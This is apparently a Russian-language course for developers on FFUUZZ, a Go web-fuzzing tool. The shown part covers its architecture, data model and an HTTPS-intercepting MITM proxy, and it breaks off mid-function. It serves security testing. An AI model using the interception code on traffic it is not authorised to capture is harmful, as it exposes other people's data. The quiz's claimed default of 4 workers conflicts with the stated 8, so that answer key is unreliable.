# Полный курс по проекту FFUUZZ: Безопасность веб-приложений через мутационный фаззинг

---

## Метаданные курса

**Название:** Полный курс по проекту FFUUZZ: Безопасность веб-приложений через мутационный фаззинг  
**Целевая аудитория:** Go разработчики среднего уровня, специалисты по безопасности  
**Предварительные требования:**

- Базовые знания Go (структуры, интерфейсы, горутины, каналы)
- Понимание HTTP/HTTPS протоколов
- Базовые знания SQL и PostgreSQL
- Знакомство с React и TypeScript (для фронтенд-модуля)

**Длительность:** ~20-25 часов (10 модулей по 2-2.5 часа каждый)

---

## Оглавление

1. [Модуль 1: Введение и обзор архитектуры](#модуль-1-введение-и-обзор-архитектуры)
2. [Модуль 2: Доменная модель и хранение данных](#модуль-2-доменная-модель-и-хранение-данных)
3. [Модуль 3: MITM-прокси и захват трафика](#модуль-3-mitm-прокси-и-захват-трафика)
4. [Модуль 4: Запись и нормализация трафика](#модуль-4-запись-и-нормализация-трафика)
5. [Модуль 5: Система мутаций](#модуль-5-система-мутаций)
6. [Модуль 6: Движок фаззинга и воркеры](#модуль-6-движок-фаззинга-и-воркеры)
7. [Модуль 7: Воспроизведение запросов и контекст](#модуль-7-воспроизведение-запросов-и-контекст)
8. [Модуль 8: Обнаружение аномалий и триаж](#модуль-8-обнаружение-аномалий-и-триаж)
9. [Модуль 9: REST API и веб-интерфейс](#модуль-9-rest-api-и-веб-интерфейс)
10. [Модуль 10: Инфраструктура, метрики и CI/CD](#модуль-10-инфраструктура-метрики-и-cicd)
11. [Приложение A: Глоссарий терминов](#приложение-a-глоссарий-терминов)
12. [Приложение B: Шпаргалка](#приложение-b-шпаргалка)
13. [Приложение C: Заметки для инструктора](#приложение-c-заметки-для-инструктора)

---

# Модуль 1: Введение и обзор архитектуры

## Обзор

FFUUZZ — это инструмент для тестирования безопасности веб-приложений методом мутационного фаззинга. Система работает по принципу "запиши и мутируй": перехватывает HTTP/HTTPS-трафик, сохраняет его как шаблоны (сиды), а затем генерирует и отправляет мутированные запросы для выявления уязвимостей. Этот модуль знакомит с архитектурой системы, её компонентами и жизненным циклом.

## Цели обучения

- Понять назначение и принцип работы FFUUZZ
- Изучить архитектуру системы и взаимодействие компонентов
- Освоить структуру проекта и ключевые файлы
- Разобраться в процессе запуска и graceful shutdown
- Понять иерархию конфигурации (env → flags → defaults)

## Основные концепции

### Что такое фаззинг?

**Аналогия:** Представьте, что вы тестируете прочность стеклянной вазы. Вместо того чтобы аккуратно ставить её на полку, вы начинаете:

- Бросать в неё разные предметы (мутации)
- Дуть с разной силой (нагрузочное тестирование)
- Менять температуру (граничные значения)
- Проверять, при каких условиях она разобьётся (обнаружение аномалий)

Фаззинг — это автоматизированное тестирование, при котором приложению подаются случайные, некорректные или неожиданные входные данные для выявления сбоев, уязвимостей и непредвиденного поведения.

### Архитектура FFUUZZ

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              FFUUZZ ARCHITECTURE                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────┐     ┌─────────────┐     ┌─────────────┐                    │
│  │   Browser   │────▶│ MITM Proxy  │────▶│   Target    │                    │
│  │   / Client  │◄────│   :8080     │◄────│   (SUT)     │                    │
│  └─────────────┘     └──────┬──────┘     └─────────────┘                    │
│                             │                                               │
│                             ▼                                               │
│                    ┌─────────────────┐                                      │
│                    │    Recorder     │                                      │
│                    │  (JSONL / DB)   │                                      │
│                    └────────┬────────┘                                      │
│                             │                                               │
│                             ▼                                               │
│  ┌──────────────────────────────────────────────────────────────┐           │
│  │                        CONTROL API :8081                     │           │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐  │           │
│  │  │Campaigns │  │Recordings│  │ Findings │  │    Web UI    │  │           │
│  │  │   API    │  │   API    │  │   API    │  │   (React)    │  │           │
│  │  └────┬─────┘  └──────────┘  └──────────┘  └──────────────┘  │           │
│  │       │                                                      │           │
│  │  ┌────▼──────────────────────────────────────────────────┐   │           │
│  │  │                    FUZZ ENGINE                        │   │           │
│  │  │  ┌────────┐  ┌────────┐  ┌────────┐  ┌────────────┐   │   │           │
│  │  │  │Worker 1│  │Worker 2│  │Worker N│  │  Triage    │   │   │           │
│  │  │  │(mutate │  │(mutate │  │(mutate │  │ (confirm & │   │   │           │
│  │  │  │→replay)│  │→replay)│  │→replay)│  │ minimize)  │   │   │           │
│  │  │  └───┬────┘  └────────┘  └────────┘  └────────────┘   │   │           │
│  │  │      │                                                │   │           │
│  │  │  ┌───▼───────────────────────────────────────────┐    │   │           │
│  │  │  │              Rate Limiter (RPS)               │    │   │           │
│  │  │  └───────────────────────────────────────────────┘    │   │           │
│  │  └───────────────────────────────────────────────────────┘   │           │
│  └──────────────────────────────────────────────────────────────┘           │
│                              │                                              │
│                              ▼                                              │
│                    ┌─────────────────┐                                      │
│                    │   PostgreSQL    │                                      │
│                    │  + Artifacts    │                                      │
│                    └─────────────────┘                                      │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Поток данных в системе

```
┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
│  Record  │───▶│  Mutate  │───▶│  Replay  │───▶│  Detect  │───▶│  Triage  │
│  Traffic │    │  Request │    │  to SUT  │    │ Anomaly  │    │ Finding  │
└──────────┘    └──────────┘    └──────────┘    └──────────┘    └──────────┘
      │               │               │               │               │
      ▼               ▼               ▼               ▼               ▼
  Recording      Exchange       HTTP Request      AnomalyHit      Finding
  Session        Mutation       to Target         Detection       + Artifact
```

## Практический разбор кода

### Точка входа: cmd/ffuuzz/main.go

```go
// Command ffuuzz is the main entry point for the web API fuzzing engine.
package main

import (
	"os"

	"ffuuzz/internal/cli"
)

func main() {
	c := cli.New(os.Stdout, os.Stderr)
	os.Exit(c.Run(os.Args[1:]))
}
```

**Ключевые моменты:**

- Минимальная точка входа — делегирует всю работу пакету `cli`
- Возвращает exit code для shell-скриптов
- Легко тестируется (можно подменить stdout/stderr)

### CLI-структура: internal/cli/cli.go

```go
type CLI struct {
	stdout io.Writer
	stderr io.Writer
}

func (c *CLI) Run(args []string) int {
	cmd := args[0]
	switch cmd {
	case "serve":
		return c.runServe(args[1:])
	case "proxy":
		return c.runProxy(args[1:])
	case "record":
		return c.runRecord(args[1:])
	}
}
```

**Три команды:**

1. **`serve`** — полный режим (прокси + API + engine + web UI)
2. **`proxy`** — только MITM-прокси (dev-режим, запись в JSONL)
3. **`record`** — анализ записанного JSONL-лога

### Процесс запуска serve: internal/cli/serve.go

```go
func (c *CLI) runServe(args []string) int {
	// 1. Загрузка конфигурации
	cfg, err := config.Load(args)

	// 2. Подключение к БД
	database, err := db.Open(cfg.DatabaseURI, logger)
	defer func() { _ = database.Close() }()

	// 3. Создание store-ов
	recordingStore := db.NewRecordingStore(database.DB, logger)
	campaignStore := db.NewCampaignStore(database.DB, logger)
	findingStore := db.NewFindingStore(database.DB, logger)
	artifactStore := db.NewArtifactStore(database.DB, logger)

	// 4. Создание менеджера корпуса
	corpusMgr := corpus.NewManager(recordingStore, campaignStore, logger)

	// 5. Создание движка
	eng := engine.NewEngine(campaignStore, findingStore, artifactStore,
		corpusMgr, cfg.ArtifactDir, logger)

	// 6. Endpoint resolver
	resolver := endpoint.NewResolver(recordingStore, logger)
	resolver.RebuildFromDB(context.Background())

	// 7. Рекордер
	rec := recorder.NewDBRecorder(recordingStore, resolver, logger)

	// 8. Хранилище сертификатов
	cs, err := store.NewCertStore(cfg.CertCache, cfg.TLS, logger)

	// 9. MITM-прокси
	proxy := mitm.New(mitm.Config{...})

	// 10. Запуск прокси в горутине
	go func() { proxy.ListenAndServe() }()

	// 11. Подготовка встроенного SPA
	webFS, err := fs.Sub(web.DistFS, "dist")

	// 12. API-сервер
	apiSrv := api.NewServer(api.ServerConfig{...})
	go func() { apiSrv.ListenAndServe() }()

	// 13. Фоновый reproduce worker
	eng.StartReproduceWorker(ctx)

	// 14. Ожидание сигнала
	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	<-ctx.Done()

	// 15. Graceful shutdown
	apiSrv.Shutdown(shutCtx)
	eng.StopAll(shutCtx)
	proxy.Shutdown(shutCtx)
}
```

### Конфигурация: internal/config/config.go

```go
type Config struct {
	APIAddress      string          // :8081
	ProxyAddress    string          // :8080
	DatabaseURI     string          // postgres://...
	ArtifactDir     string          // ./artifacts
	ReqTimeout      time.Duration   // 3s
	ShutdownTimeout time.Duration   // 30s
	Workers         int             // 8
	RPS             int             // 50
	MaxBodyBytes    int             // 64KB
	TLSSkipVerify   bool            // true
	TLS             TLSConfig
	CertCache       CertCacheConfig
}
```

**Иерархия конфигурации:**

```
┌─────────────────────────────────────────────────────────┐
│  Приоритет конфигурации (от высшего к низшему)          │
├─────────────────────────────────────────────────────────┤
│  1. CLI-флаги (-a, -p, -d, ...)                         │
│  2. Переменные окружения (FFUUZZ_API_ADDRESS, ...)      │
│  3. Значения по умолчанию (DefaultConfig())             │
└─────────────────────────────────────────────────────────┘
```

**Ключевые параметры:**

| Параметр         | Env                       | Flag | Дефолт           | Описание                  |
| ---------------- | ------------------------- | ---- | ---------------- | ------------------------- |
| API-адрес        | `FFUUZZ_API_ADDRESS`      | `-a` | `:8081`          | Адрес Control API         |
| Прокси-адрес     | `FFUUZZ_PROXY_ADDRESS`    | `-p` | `:8080`          | Адрес MITM-прокси         |
| PostgreSQL URI   | `FFUUZZ_DATABASE_URI`     | `-d` | `postgres://...` | Строка подключения        |
| Папка артефактов | `FFUUZZ_ARTIFACT_DIR`     | `-o` | `./artifacts`    | Хранилище артефактов      |
| Таймаут запросов | `FFUUZZ_REQ_TIMEOUT`      | —    | `3s`             | Таймаут HTTP-запросов     |
| Таймаут shutdown | `FFUUZZ_SHUTDOWN_TIMEOUT` | —    | `30s`            | Таймаут graceful shutdown |
| Воркеры          | `FFUUZZ_WORKERS`          | —    | `8`              | Количество воркеров       |
| RPS              | `FFUUZZ_RPS`              | —    | `50`             | Лимит запросов в секунду  |

### Graceful Shutdown

```
Получен SIGINT/SIGTERM
    │
    ▼
┌─────────────────────────────────────────┐
│ 1. apiSrv.Shutdown(ctx)                 │
│    └─ Перестаём принимать новые запросы │
│    └─ Ждём завершения in-flight         │
└─────────────────┬───────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────┐
│ 2. eng.StopAll(ctx)                     │
│    └─ Отменяем все кампании             │
│    └─ Ждём завершения reproduce worker  │
└─────────────────┬───────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────┐
│ 3. proxy.Shutdown(ctx)                  │
│    └─ Останавливаем MITM-прокси         │
└─────────────────┬───────────────────────┘
                  │
                  ▼
┌─────────────────────────────────────────┐
│ 4. database.Close()                     │
│    └─ Закрываем соединение с PostgreSQL │
└─────────────────────────────────────────┘
```

## Ключевые файлы для изучения

| Файл                           | Назначение            |
| ------------------------------ | --------------------- |
| `cmd/ffuuzz/main.go`           | Точка входа           |
| `internal/cli/cli.go`          | Роутинг CLI-команд    |
| `internal/cli/serve.go`        | Запуск полной системы |
| `internal/config/config.go`    | Конфигурация          |
| `docs/ffuuzz-specification.md` | Полная спецификация   |
| `docs/codebase-walkthrough.md` | Обзор кодовой базы    |

## Практические упражнения

### Упражнение 1.1: Запуск системы

**Задача:** Запустите FFUUZZ в режиме `serve` и проверьте health endpoint.

```bash
# 1. Запустите PostgreSQL
docker-compose up -d

# 2. Соберите проект
make build

# 3. Запустите в режиме serve
./ffuuzz serve -a :8081 -p :8080

# 4. Проверьте health в другом терминале
curl http://localhost:8081/healthz
```

**Ожидаемый результат:**

```json
{
  "status": "ok",
  "db": "ok",
  "version": "0.1.0",
  "time": "2026-04-01T12:00:00Z"
}
```

### Упражнение 1.2: Исследование конфигурации

**Задача:** Запустите FFUUZZ с разными способами конфигурации и проверьте приоритет.

```bash
# Способ 1: Только дефолты
./ffuuzz serve

# Способ 2: Переменные окружения
export FFUUZZ_API_ADDRESS=":9090"
export FFUUZZ_WORKERS=16
./ffuuzz serve

# Способ 3: CLI-флаги (переопределяют env)
./ffuuzz serve -a :7070 -p :6060 --cert-memory-only
```

### Упражнение 1.3 (Challenge): Graceful Shutdown

**Задача:** Напишите скрипт, который:

1. Запускает FFUUZZ в фоне
2. Через 5 секунд отправляет SIGTERM
3. Проверяет корректность завершения по логам

**Подсказка:** Используйте `trap` в bash или `context.WithTimeout` в Go.

## Типичные ошибки и заблуждения

| Ошибка                                         | Почему это проблема                             | Как исправить                                                        |
| ---------------------------------------------- | ----------------------------------------------- | -------------------------------------------------------------------- |
| Забыть установить `FFUUZZ_DATABASE_URI`        | Используется дефолт, который может не подходить | Всегда явно указывайте параметры подключения                         |
| Запускать прокси без прав на запись в `certs/` | Ошибка генерации сертификатов                   | Убедитесь в правах на директорию или используйте `-cert-memory-only` |
| Игнорировать `ShutdownTimeout`                 | При SIGTERM процесс может зависнуть             | Установите разумный таймаут (10-60 секунд)                           |
| Путать порты API и прокси                      | :8080 (прокси) vs :8081 (API)                   | Запомните: прокси — :8080, API — :8081                               |

## Проверка знаний

1. **Вопрос:** Какой компонент отвечает за перехват HTTPS-трафика?
   - A) API Server
   - B) MITM Proxy
   - C) Fuzz Engine
   - D) Recorder

2. **Вопрос:** В каком порядке применяется конфигурация (от высшего приоритета)?
   - A) defaults → env → flags
   - B) flags → env → defaults
   - C) env → flags → defaults
   - D) defaults → flags → env

3. **Вопрос:** Что произойдёт, если отправить SIGTERM процессу FFUUZZ?
   - A) Процесс немедленно завершится
   - B) Начнётся graceful shutdown в порядке: API → Engine → Proxy → DB
   - C) Только остановится прокси
   - D) Ничего, SIGTERM игнорируется

4. **Вопрос (что будет, если...):** Что произойдёт, если указать `-workers 0`?
   - A) Кампания не запустится
   - B) Будет использовано значение по умолчанию (4)
   - C) Система упадёт с panic
   - D) Будет создано неограниченное количество воркеров

5. **Вопрос:** Какая команда CLI используется только для записи в JSONL без БД?
   - A) `serve`
   - B) `proxy`
   - C) `record`
   - D) `capture`

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-B

## Резюме и следующие шаги

В этом модуле мы:

- Познакомились с назначением FFUUZZ и принципом фаззинга
- Изучили архитектуру системы и её компоненты
- Разобрали процесс запуска и graceful shutdown
- Поняли иерархию конфигурации

**Следующий модуль:** Доменная модель и хранение данных — изучим структуры данных (RecordingSession, Campaign, Finding) и схему базы данных.

---

# Модуль 2: Доменная модель и хранение данных

## Обзор

Этот модуль посвящён пониманию ключевых сущностей FFUUZZ и их хранению. Мы изучим доменную модель, жизненные циклы объектов, схему базы данных и паттерны работы с SQL.

## Цели обучения

- Понять ключевые доменные типы: RecordingSession, Exchange, Campaign, Finding
- Изучить жизненные циклы Campaign и Finding
- Разобраться в схеме базы данных и миграциях
- Освоить паттерны работы с sqlx
- Понять механизм baseline-вычислений

## Основные концепции

### Доменная модель

**Аналогия:** Представьте систему библиотеки:

- **RecordingSession** = Книга (содержит страницы)
- **Exchange** = Страница в книге (один запрос/ответ)
- **Campaign** = Исследовательский проект (использует книги как источники)
- **Finding** = Важное открытие, сделанное в ходе исследования

### RecordingSession и Exchange

```go
// RecordingSession — записанная HTTP-сессия
type RecordingSession struct {
    SchemaVersion int        // Версия схемы (1)
    ID            string     // UUID
    CreatedAt     time.Time  // Время создания
    Target        TargetInfo // scheme://host:port/path
    Entries       []Exchange // HTTP-обмены
    EntryCount    int        // Количество записей
}

// Exchange — один HTTP-запрос/ответ
type Exchange struct {
    RequestID  string       // YYYYMMDD-UUIDv4
    StartedAt  time.Time    // Время начала
    DurationMs int64        // Длительность
    Request    RequestData  // Метод, путь, заголовки, тело
    Response   ResponseData // Статус, заголовки, тело
}
```

### Жизненный цикл Campaign

```
┌──────────┐    ┌──────────┐    ┌──────────┐
│  CREATED │───▶│ STARTING │───▶│ RUNNING  │
└──────────┘    └──────────┘    └────┬─────┘
                                     │
        ┌────────────────────────────┼────────────────────────────┐
        │                            │                            │
        ▼                            ▼                            ▼
  ┌──────────┐                ┌──────────┐                ┌──────────┐
  │ FINISHED │                │ STOPPING │───────────────▶│ STOPPED  │
  │(success) │                │          │                │          │
  └──────────┘                └──────────┘                └──────────┘

                              ┌──────────┐
                              │  FAILED  │
                              │ (error)  │
                              └──────────┘
```

### Типы Finding

```go
const (
    FindingTimeout           FindingType = "TIMEOUT"            // Таймаут
    FindingServerError       FindingType = "SERVER_ERROR"       // 5xx
    FindingLatencyRegression FindingType = "LATENCY_REGRESSION" // Деградация
    FindingRegexMatch        FindingType = "REGEX_MATCH"        // Совпадение regex
)
```

### Жизненный цикл ReproduceStatus

```
┌─────────┐    ┌──────────┐    ┌─────────┐    ┌──────────────────────────────────────┐
│ PENDING │───▶│ ENQUEUED │───▶│ RUNNING │───▶│ CONFIRMED / NOT_REPRODUCED / FAILED  │
└─────────┘    └──────────┘    └─────────┘    └──────────────────────────────────────┘
```

## Практический разбор кода

### Модель: internal/model/model.go

```go
// Campaign — центральная сущность фаззинга
type Campaign struct {
    ID           string            // UUID
    Name         string            // Название
    Status       CampaignStatus    // CREATED, RUNNING, etc.
    CreatedAt    time.Time
    UpdatedAt    time.Time
    StartedAt    *time.Time        // nullable
    FinishedAt   *time.Time        // nullable
    RecordingIDs []string          // Сиды для фаззинга
    Config       CampaignConfig    // Конфигурация
    Progress     *CampaignProgress // Статистика
}

// CampaignConfig — полная конфигурация кампании
type CampaignConfig struct {
    Target          TargetURL        // Базовый URL цели
    Limits          CampaignLimits   // Workers, RPS, MaxTests, Duration
    Mutations       MutationConfig   // Какие мутаторы включены
    Anomaly         AnomalyConfig    // Какие детекторы включены
    Triage          TriageConfig     // Подтверждение и минимизация
    ExtractionRules []ExtractionRule // Правила извлечения переменных
}
```

### Схема базы данных

```sql
-- recordings: записанные сессии
CREATE TABLE recordings (
    id UUID PRIMARY KEY,
    schema_version INT NOT NULL DEFAULT 1,
    created_at TIMESTAMPTZ NOT NULL,
    target_scheme TEXT NOT NULL,
    target_host TEXT NOT NULL,
    target_port INT NOT NULL,
    entry_count INT NOT NULL DEFAULT 0
);

-- exchanges: HTTP-обмены внутри сессий
CREATE TABLE exchanges (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    recording_id UUID NOT NULL REFERENCES recordings(id) ON DELETE CASCADE,
    request_id TEXT NOT NULL,
    started_at TIMESTAMPTZ NOT NULL,
    duration_ms INT NOT NULL,
    req_method TEXT NOT NULL,
    req_path TEXT NOT NULL,
    req_query TEXT NOT NULL DEFAULT '',
    req_headers JSONB,
    req_body_b64 TEXT NOT NULL DEFAULT '',
    resp_status INT NOT NULL,
    resp_headers JSONB,
    resp_body_b64 TEXT NOT NULL DEFAULT '',
    seq_order INT NOT NULL
);

-- campaigns: кампании фаззинга
CREATE TABLE campaigns (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    name TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'CREATED',
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    updated_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    started_at TIMESTAMPTZ,
    finished_at TIMESTAMPTZ,
    config JSONB NOT NULL DEFAULT '{}',
    tests_done INT NOT NULL DEFAULT 0,
    findings_total INT NOT NULL DEFAULT 0
);

-- campaign_recordings: связь M:N
CREATE TABLE campaign_recordings (
    campaign_id UUID NOT NULL REFERENCES campaigns(id) ON DELETE CASCADE,
    recording_id UUID NOT NULL REFERENCES recordings(id),
    PRIMARY KEY (campaign_id, recording_id)
);

-- findings: обнаруженные аномалии
CREATE TABLE findings (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    campaign_id UUID NOT NULL REFERENCES campaigns(id),
    type TEXT NOT NULL,
    status TEXT NOT NULL DEFAULT 'UNCONFIRMED',
    signature TEXT NOT NULL,  -- ключ дедупликации
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    confirmed_at TIMESTAMPTZ,
    method TEXT NOT NULL,
    endpoint TEXT NOT NULL,
    details JSONB,
    minimized BOOL NOT NULL DEFAULT FALSE,
    reproduce_status TEXT
);
```

### Store-паттерн: internal/db/recordings.go

```go
// RecordingStore — абстракция над таблицей recordings
type RecordingStore struct {
    db     *sqlx.DB
    logger zerolog.Logger
}

// FindOrAppend — идемпотентная вставка
// Если запись для (scheme, host, port, path) существует — добавляет exchange
// Если нет — создаёт новую запись
func (s *RecordingStore) FindOrAppend(ctx context.Context, sess model.RecordingSession) (string, bool, error) {
    // 1. Ищем существующую запись
    var existingID string
    err := s.db.GetContext(ctx, &existingID, `
        SELECT id FROM recordings
        WHERE target_scheme = $1 AND target_host = $2
          AND target_port = $3 AND target_path = $4
    `, sess.Target.Scheme, sess.Target.Host, sess.Target.Port, sess.Target.Path)

    if err == nil {
        // 2. Добавляем exchange к существующей
        // ...
        return existingID, false, nil  // Не создали новую
    }

    // 3. Создаём новую запись
    // ...
    return newID, true, nil  // Создали новую
}
```

### Baseline-вычисление: internal/corpus/corpus.go

```go
// BaselineEntry — базовая метрика для endpoint
type BaselineEntry struct {
    Method     string
    Endpoint   string
    P50Ms      int64  // Медиана latency
    StatusCode int    // Ожидаемый статус
}

// ComputeBaseline вычисляет p50 latency для каждого (method, endpoint)
func ComputeBaseline(sessions []model.RecordingSession) map[string]BaselineEntry {
    // Группируем по ключу method|endpoint
    groups := make(map[string][]int64)

    for _, sess := range sessions {
        for _, ex := range sess.Entries {
            key := ex.Request.Method + "|" + sess.Target.Path
            groups[key] = append(groups[key], ex.DurationMs)
        }
    }

    // Вычисляем медиану для каждой группы
    baselines := make(map[string]BaselineEntry)
    for key, durations := range groups {
        sort.Slice(durations, func(i, j int) bool {
            return durations[i] < durations[j]
        })
        p50 := durations[len(durations)/2]

        parts := strings.Split(key, "|")
        baselines[key] = BaselineEntry{
            Method:   parts[0],
            Endpoint: parts[1],
            P50Ms:    p50,
        }
    }

    return baselines
}
```

## Ключевые файлы для изучения

| Файл                           | Назначение          |
| ------------------------------ | ------------------- |
| `internal/model/model.go`      | Все доменные типы   |
| `internal/db/migrations/*.sql` | Схема БД            |
| `internal/db/recordings.go`    | Store для записей   |
| `internal/db/campaigns.go`     | Store для кампаний  |
| `internal/db/findings.go`      | Store для находок   |
| `internal/corpus/corpus.go`    | Baseline-вычисление |

## Практические упражнения

### Упражнение 2.1: Исследование модели

**Задача:** Изучите структуру `CampaignConfig` и опишите, какие параметры влияют на:

1. Производительность (скорость фаззинга)
2. Качество находок
3. Потребление ресурсов

```go
// Найдите в internal/model/model.go:
type CampaignLimits struct {
    Workers      int   // ?
    RPS          int   // ?
    MaxTests     int   // ?
    DurationSec  int   // ?
    ReqTimeoutMs int64 // ?
}
```

### Упражнение 2.2: SQL-запросы

**Задача:** Напишите SQL-запросы для:

1. Получения всех кампаний со статусом RUNNING
2. Подсчёта находок по типам для кампании
3. Получения всех exchanges для recording_id

**Ответы:**

```sql
-- 1. RUNNING кампании
SELECT * FROM campaigns WHERE status = 'RUNNING';

-- 2. Находки по типам
SELECT type, COUNT(*) FROM findings
WHERE campaign_id = $1 GROUP BY type;

-- 3. Exchanges для записи
SELECT * FROM exchanges
WHERE recording_id = $1 ORDER BY seq_order;
```

### Упражнение 2.3 (Challenge): Расширение модели

**Задача:** Добавьте новое поле `Tags` к структуре `Campaign`.

1. Обновите `internal/model/model.go`
2. Создайте миграцию `006_campaign_tags.up.sql`
3. Обновите `CampaignStore.Create()`

**Подсказка:** Используйте тип PostgreSQL `TEXT[]` для массива строк.

## Типичные ошибки и заблуждения

| Ошибка                                    | Почему это проблема               | Как исправить                                  |
| ----------------------------------------- | --------------------------------- | ---------------------------------------------- |
| Игнорировать `context.Context` в запросах | Невозможно отменить долгий запрос | Всегда используйте `GetContext`, `ExecContext` |
| Забывать про `ON DELETE CASCADE`          | Мусор в БД при удалении           | Правильно настраивайте foreign keys            |
| Хранить большие бинарные данные в БД      | Раздувание таблиц                 | Используйте файловое хранилище (artifacts)     |
| Не использовать транзакции                | Неконсистентность данных          | Оборачивайте связанные операции в `db.BeginTx` |

## Проверка знаний

1. **Вопрос:** Какой тип Finding соответствует HTTP 500?
   - A) TIMEOUT
   - B) SERVER_ERROR
   - C) LATENCY_REGRESSION
   - D) REGEX_MATCH

2. **Вопрос:** Что такое baseline в контексте FFUUZZ?
   - A) Начальная конфигурация
   - B) Медиана latency для endpoint
   - C) Первый запрос в сессии
   - D) Минимальный размер корпуса

3. **Вопрос:** Какой статус кампании означает успешное завершение?
   - A) STOPPED
   - B) FINISHED
   - C) COMPLETED
   - D) SUCCESS

4. **Вопрос (что будет, если...):** Что произойдёт, если удалить запись, используемую активной кампанией?
   - A) Удаление пройдёт успешно
   - B) Будет ошибка 409 Conflict
   - C) Кампания автоматически остановится
   - D) Система упадёт

5. **Вопрос:** Какой метод `RecordingStore` обеспечивает идемпотентность импорта?
   - A) Create
   - B) Upsert
   - C) FindOrAppend
   - D) Insert

**Ответы:** 1-B, 2-B, 3-B, 4-B, 5-C

## Резюме и следующие шаги

В этом модуле мы:

- Изучили ключевые доменные типы и их отношения
- Разобрали жизненные циклы Campaign и Finding
- Познакомились со схемой БД и миграциями
- Освоили store-паттерн и baseline-вычисления

**Следующий модуль:** MITM-прокси и захват трафика — изучим, как FFUUZZ перехватывает HTTPS и управляет TLS-сертификатами.

---

# Модуль 3: MITM-прокси и захват трафика

## Обзор

Этот модуль посвящён сердцу системы записи — MITM-прокси. Мы разберём, как FFUUZZ перехватывает HTTP и HTTPS-трафик, управляет TLS-сертификатами и обрабатывает соединения.

## Цели обучения

- Понять разницу между HTTP и HTTPS-проксированием
- Изучить механизм MITM (Man-In-The-Middle) для HTTPS
- Разобраться в управлении TLS-сертификатами
- Освоить паттерны TeeReadCloser и LimitedBuffer
- Понять метрики прокси

## Основные концепции

### HTTP vs HTTPS-проксирование

**Аналогия:** Представьте почтовую службу:

- **HTTP** = Открытка (все видят содержимое)
- **HTTPS** = Запечатанный конверт (содержимое зашифровано)
- **MITM-прокси** = Почтамт, который:
  - Для открыток: просто копирует и пересылает
  - Для конвертов: вскрывает, копирует, запечатывает заново

### Протокол CONNECT

```
Клиент                    Прокси                    Сервер
   │                         │                         │
   │  CONNECT example.com:443│                         │
   │────────────────────────▶│                         │
   │                         │                         │
   │  200 Connection         │                         │
   │  established            │                         │
   │◀────────────────────────│                         │
   │                         │                         │
   │═══════ TLS ═══════════════════════════════════════│
   │  (шифрованный туннель)  │                         │
   │                         │                         │
```

### Архитектура MITM

```
┌─────────────────────────────────────────────────────────────────┐
│                      MITM Proxy Flow                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  HTTP Request                    HTTPS (CONNECT)                │
│       │                               │                         │
│       ▼                               ▼                         │
│  ┌─────────┐                    ┌─────────┐                     │
│  │handleHTTP│                   │handleCONNECT                  │
│  └────┬────┘                    └────┬────┘                     │
│       │                              │                          │
│       │                              ▼                          │
│       │                         ┌─────────┐                     │
│       │                         │ Hijack  │ (забираем TCP-сокет)│
│       │                         └────┬────┘                     │
│       │                              │                          │
│       │                              ▼                          │
│       │                         ┌──────────────┐                │
│       │                         │mitmHTTPS     │                │
│       │                         │              │                │
│       │                         │ 1. Write     │                │
│       │                         │    200       │                │
│       │                         │ 2. Get       │                │
│       │                         │    Cert      │                │
│       │                         │ 3. TLS       │                │
│       │                         │    Handshake │                │
│       │                         │ 4. Serve     │                │
│       │                         │    HTTP      │                │
│       │                         └────┬─────────┘                │
│       │                              │                          │
│       └──────────────────────────────┘                          │
│                                      │                          │
│                                      ▼                          │
│                               ┌──────────┐                      │
│                               │handleHTTP│ (внутри TLS)         │
│                               └────┬─────┘                      │
│                                    │                            │
│                                    ▼                            │
│                            ┌─────────────┐                      │
│                            │  Recorder   │                      │
│                            │   Record()  │                      │
│                            └─────────────┘                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

## Практический разбор кода

### Основной прокси: internal/mitm/mitm.go

```go
// Proxy — MITM HTTP/HTTPS-прокси
type Proxy struct {
    cfg       Config
    transport *http.Transport
    server    *http.Server
    logger    zerolog.Logger
}

// ServeHTTP — точка входа для всех запросов
func (p *Proxy) ServeHTTP(w http.ResponseWriter, r *http.Request) {
    if r.Method == http.MethodConnect {
        p.handleCONNECT(w, r)  // HTTPS
        return
    }
    p.handleHTTP(w, r)  // HTTP
}
```

### Обработка HTTP

```go
func (p *Proxy) handleHTTP(w http.ResponseWriter, r *http.Request) {
    start := time.Now()
    reqID := httputil.NewRequestID()

    // 1. Клонируем запрос
    outReq := r.Clone(r.Context())
    outReq.RequestURI = ""

    // 2. Удаляем hop-by-hop заголовки
    httputil.RemoveHopByHop(outReq.Header)

    // 3. TeeReadCloser — читаем тело для записи, но не потребляем
    reqBuf := httputil.NewLimitedBuffer(p.cfg.MaxBodyBytes)
    if r.Body != nil {
        outReq.Body = httputil.NewTeeReadCloser(r.Body, reqBuf)
    }

    // 4. Отправляем upstream
    resp, err := p.transport.RoundTrip(outReq)

    // 5. Копируем ответ клиенту + записываем
    respBuf := httputil.NewLimitedBuffer(p.cfg.MaxBodyBytes)
    mw := io.MultiWriter(w, respBuf)
    io.Copy(mw, resp.Body)

    // 6. Формируем запись
    tx := &recorder.TxRecord{
        RequestID:  reqID,
        Time:       start,
        Method:     r.Method,
        URL:        outReq.URL.String(),
        ReqHeaders: outReq.Header.Clone(),
        RespStatus: resp.StatusCode,
        // ...
    }

    // 7. Сохраняем
    p.cfg.Recorder.Record(tx)
}
```

### Обработка CONNECT (HTTPS)

```go
func (p *Proxy) handleCONNECT(w http.ResponseWriter, r *http.Request) {
    reqID := httputil.NewRequestID()
    host, _, _ := net.SplitHostPort(r.Host)

    // 1. Hijack — забираем сырой TCP-сокет
    hj, _ := w.(http.Hijacker)
